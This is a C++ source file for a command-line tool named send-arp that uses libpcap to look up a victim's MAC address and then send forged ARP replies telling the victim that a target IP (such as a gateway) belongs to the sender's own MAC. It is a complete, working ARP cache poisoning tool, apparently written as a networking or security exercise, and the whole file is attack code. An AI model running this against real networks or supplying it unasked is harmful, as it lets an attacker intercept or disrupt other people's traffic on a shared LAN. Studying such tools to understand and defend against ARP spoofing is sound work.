#include <cstdio>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#define BUF_SIZE 1024
#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

// from internet
bool get_my_mac(const char* dev, Mac* my_mac) {
	char path[BUF_SIZE];
	if (snprintf(path, sizeof(path), "/sys/class/net/%s/address", dev) < 0) {
		return false;
	}

	FILE* fp = fopen(path, "r");
	if (fp == nullptr) {
		fprintf(stderr, "failed to open %s\n", path);
		return false;
	}

	char mac_str[18] = {0};
	if (fgets(mac_str, sizeof(mac_str), fp) == nullptr) {
		fclose(fp);
		fprintf(stderr, "failed to read mac address from %s\n", path);
		return false;
	}
	fclose(fp);

	*my_mac = Mac(mac_str);
	return true;
}

// from internet
bool get_my_ip(const char* dev, Ip* my_ip) {
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0) return false;

	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

	if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
		close(fd);
		return false;
	}
	close(fd);

	struct sockaddr_in* sin = reinterpret_cast<struct sockaddr_in*>(&ifr.ifr_addr);
	*my_ip = Ip(ntohl(sin->sin_addr.s_addr));
	return true;
}

bool get_mac_by_arp(pcap_t* pcap, const Mac& my_mac, const Ip& my_ip, const Ip& query_ip, Mac* query_mac) {
	EthArpPacket req_packet;
	req_packet.eth_.dmac_ = Mac::broadcastMac();
	req_packet.eth_.smac_ = my_mac;
	req_packet.eth_.type_ = htons(EthHdr::Arp);

	req_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	req_packet.arp_.pro_ = htons(EthHdr::Ip4);
	req_packet.arp_.hln_ = Mac::Size;
	req_packet.arp_.pln_ = Ip::Size;
	req_packet.arp_.op_ = htons(ArpHdr::Request);
	req_packet.arp_.smac_ = my_mac;
	req_packet.arp_.sip_ = htonl(my_ip);
	req_packet.arp_.tmac_ = Mac::nullMac();
	req_packet.arp_.tip_ = htonl(query_ip);

	int send_res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&req_packet), sizeof(EthArpPacket));
	if (send_res != 0) {
		fprintf(stderr, "failed to send arp request: %s\n", pcap_geterr(pcap));
		return false;
	}

	while (true) {
		struct pcap_pkthdr* header;
		const u_char* recv_packet;
		int recv_res = pcap_next_ex(pcap, &header, &recv_packet);

		if (recv_res == 0) continue;
		if (recv_res == PCAP_ERROR || recv_res == PCAP_ERROR_BREAK) {
			fprintf(stderr, "pcap_next_ex failed: %s\n", pcap_geterr(pcap));
			return false;
		}
		if (header->caplen < sizeof(EthArpPacket)) continue;

		const EthArpPacket* recv_eth_arp = reinterpret_cast<const EthArpPacket*>(recv_packet);
		if (ntohs(recv_eth_arp->eth_.type_) != EthHdr::Arp) continue;
		if (ntohs(recv_eth_arp->arp_.op_) != ArpHdr::Reply) continue;
		if (ntohl(recv_eth_arp->arp_.sip_) != query_ip) continue;

		*query_mac = recv_eth_arp->arp_.smac_;
		return true;
	}
}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc % 2 != 0 ) {
		usage();
		return EXIT_FAILURE;
	}

	char* dev = argv[1];
	Mac my_mac;
	if (!get_my_mac(dev, &my_mac)) {
		return EXIT_FAILURE;
	}
	Ip my_ip;
	if (!get_my_ip(dev, &my_ip)) {
		fprintf(stderr, "failed to get my ip from %s\n", dev);
		return EXIT_FAILURE;
	}
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUF_SIZE, 1, 1, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}

	int exit_code = EXIT_SUCCESS;
	for (int i = 2; i < argc; i += 2) {
		Ip sender(argv[i]);
		Ip target(argv[i + 1]);

		Mac sender_mac;
		if (!get_mac_by_arp(pcap, my_mac, my_ip, sender, &sender_mac)) {
			fprintf(stderr, "failed to resolve sender mac for %s\n", argv[i]);
			exit_code = EXIT_FAILURE;
			continue;
		}

		EthArpPacket packet;
		packet.eth_.dmac_ = sender_mac;
		packet.eth_.smac_ = my_mac;
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::Size;
		packet.arp_.pln_ = Ip::Size;
		packet.arp_.op_ = htons(ArpHdr::Reply);
		packet.arp_.smac_ = my_mac;
		packet.arp_.sip_ = htonl(target);
		packet.arp_.tmac_ = sender_mac;
		packet.arp_.tip_ = htonl(sender);

		for (int j=0; j < 5; j++){
		int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket failed for pair %s -> %s: %s\n", argv[i], argv[i + 1], pcap_geterr(pcap));
			exit_code = EXIT_FAILURE;
		}
		}
	}

	pcap_close(pcap);
	return exit_code;
}
